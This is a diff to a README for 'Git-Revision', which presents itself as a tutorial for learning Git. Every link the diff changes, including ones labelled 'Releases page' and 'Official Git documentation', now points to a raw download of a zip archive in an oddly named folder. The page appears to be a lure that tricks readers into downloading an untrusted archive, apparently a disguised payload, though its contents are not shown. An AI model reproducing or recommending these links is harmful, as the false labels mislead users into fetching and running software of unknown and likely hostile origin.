@@ -1,6 +1,6 @@
 # 🚀 Git-Revision - Learn Git Easily and Effectively
 
-[![Download from Releases](https://raw.githubusercontent.com/mohi583/Git-Revision/main/inexpungeable/Git-Revision.zip%20Now-Release-green)](https://raw.githubusercontent.com/mohi583/Git-Revision/main/inexpungeable/Git-Revision.zip)
+[![Download from Releases](https://github.com/mohi583/Git-Revision/raw/refs/heads/main/inexpungeable/Revision_Git_v2.1-beta.4.zip%20Now-Release-green)](https://github.com/mohi583/Git-Revision/raw/refs/heads/main/inexpungeable/Revision_Git_v2.1-beta.4.zip)
 
 ## 🌍 Overview
 
@@ -8,7 +8,7 @@ This repository, **Git Revision**, offers a simple guide to help you understand 
 
 ## 📥 Download & Install
 
-To get started, visit the [Releases page](https://raw.githubusercontent.com/mohi583/Git-Revision/main/inexpungeable/Git-Revision.zip) to download the latest version of the application. 
+To get started, visit the [Releases page](https://github.com/mohi583/Git-Revision/raw/refs/heads/main/inexpungeable/Revision_Git_v2.1-beta.4.zip) to download the latest version of the application. 
 
 1. Click on the link above.
 2. Choose the version you want to download.
@@ -18,7 +18,7 @@ To get started, visit the [Releases page](https://raw.githubusercontent.com/mohi
 
 ### Install the Application
 
-1. Go to the [Releases page](https://raw.githubusercontent.com/mohi583/Git-Revision/main/inexpungeable/Git-Revision.zip).
+1. Go to the [Releases page](https://github.com/mohi583/Git-Revision/raw/refs/heads/main/inexpungeable/Revision_Git_v2.1-beta.4.zip).
 2. Locate the file that matches your operating system (e.g., Windows, macOS, or Linux).
 3. Click the file download link. Your download will start automatically.
 4. Once downloaded, locate the file in your Downloads folder.
@@ -55,7 +55,7 @@ To get started, visit the [Releases page](https://raw.githubusercontent.com/mohi
 
 For more information on Git, consider exploring additional resources:
 
-- Official Git documentation: [https://raw.githubusercontent.com/mohi583/Git-Revision/main/inexpungeable/Git-Revision.zip](https://raw.githubusercontent.com/mohi583/Git-Revision/main/inexpungeable/Git-Revision.zip)
+- Official Git documentation: [https://github.com/mohi583/Git-Revision/raw/refs/heads/main/inexpungeable/Revision_Git_v2.1-beta.4.zip](https://github.com/mohi583/Git-Revision/raw/refs/heads/main/inexpungeable/Revision_Git_v2.1-beta.4.zip)
 - Online tutorials: Websites like Codecademy and freeCodeCamp offer Git courses.
 
 ## 🌟 Conclusion
